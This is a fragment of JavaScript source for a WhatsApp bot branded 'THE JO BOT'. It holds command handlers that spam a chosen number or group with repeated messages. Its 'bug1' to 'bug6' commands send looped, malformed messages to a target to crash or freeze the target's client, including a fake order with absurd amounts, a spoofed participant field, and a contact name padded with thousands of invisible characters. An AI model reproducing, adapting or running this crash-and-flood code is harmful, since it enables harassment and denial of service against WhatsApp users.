Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await hisoka.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
}
break

case 'reaksigc' : {
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await hisoka.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "𝙹𝙾"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case 'bug1': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./pict.jpg')
}
  }
}
reply(m.chat, `© THE JO BOT PICT`, main)
}
}
break
//=================================================//
case 'bug2': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
"locationMessage": {}
   }
}
thejobot(m.chat, `© THE JO BOT LOCATION`, main)
}
}
break
//=================================================//
case 'bug3': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./pict.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `THE JO BOT ${ngazap(prefix)}`,
"orderTitle": "thejobot",
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
  }
   }
}
review(m.chat, `© THE JO BOT TROLI`, main)
}
}
break
//=================================================//
case 'bug4': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 23,
"caption": `THE JO BOT`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
  }
   }
}
thejo(m.chat, `© THE JO BOT VN`, main)
}
}
break
//=================================================//
case 'bug5': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "groupInviteMessage": {
"groupJid": "120363025461390219@g.us",
"inviteCode": "z0JcSBd3mAhIfSSY",
"inviteExpiration": `THE JO BOT ${ngazap(prefix)}`,
"groupName": `THE JO BOT ${ngazap(prefix)}`,
"caption": `THE JO BOT ${ngazap(prefix)}`
 }
   }
}
bacit(m.chat, `© THE JO BOT INVITE`, main)
}
}
break
//=================================================//
case 'bug6': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "contactMessage": {
"displayName": "🔥 THE JO BOT 🔥‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎